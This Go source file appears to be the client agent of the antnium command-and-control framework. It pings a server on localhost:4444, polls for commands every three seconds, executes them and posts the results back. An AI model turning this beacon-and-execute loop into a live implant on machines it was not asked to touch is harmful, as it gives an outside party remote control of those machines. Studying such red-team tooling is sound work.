package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/dobin/antnium/model"
	"github.com/rs/xid"
	log "github.com/sirupsen/logrus"
)

var ErrNoCommandsFound = errors.New("Server did not return any commands")

type Client struct {
	port        int
	computerId  string
	commandExec CommandExec
}

func NewClient(port int) Client {
	w := Client{port, xid.New().String(), MakeCommandExec()}
	return w
}

func (s Client) Start() {
	s.sendPing()
	for {
		s.requestAndExecute()
		time.Sleep(3 * time.Second)
	}
}

func (s Client) sendPing() {
	arguments := make(model.CmdArgument)
	arguments["msg"] = "ooy!"
	response := make(model.CmdResponse)
	command := model.NewCommand("ping", s.computerId, "0", arguments, response)
	s.sendCommand(command)
}

func (s Client) requestAndExecute() {
	command, err := s.getCommand()
	if err != nil {
		if err == ErrNoCommandsFound {
			fmt.Print(".")
			return
		}

		log.WithFields(log.Fields{
			"error": err,
		}).Info("Error get command")
		return
	}

	err = s.commandExec.execute(&command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error executing command")
		return
	}

	err = s.sendCommand(command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error sending command")
		return
	}
}

func (s Client) getCommand() (model.CommandBase, error) {
	url := "http://localhost:4444/getCommand/" + s.computerId
	resp, err := http.Get(url)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.CommandBase{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}
	bodyString := string(bodyBytes)
	if bodyString == "" {
		return model.CommandBase{}, ErrNoCommandsFound
	}

	log.WithFields(log.Fields{
		"command": bodyString,
	}).Info("Received Command")

	var commandBase model.CommandBase
	if err := json.Unmarshal([]byte(bodyString), &commandBase); err != nil {
		return model.CommandBase{}, err
	}
	return commandBase, nil
}

func (s Client) sendCommand(command model.CommandBase) error {
	url := "http://localhost:4444/sendCommand"

	// Setup response
	command.ComputerId = s.computerId
	json, err := json.Marshal(command)
	if err != nil {
		return err
	}

	log.WithFields(log.Fields{
		"command": string(json),
	}).Info("Send Command")

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(json))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
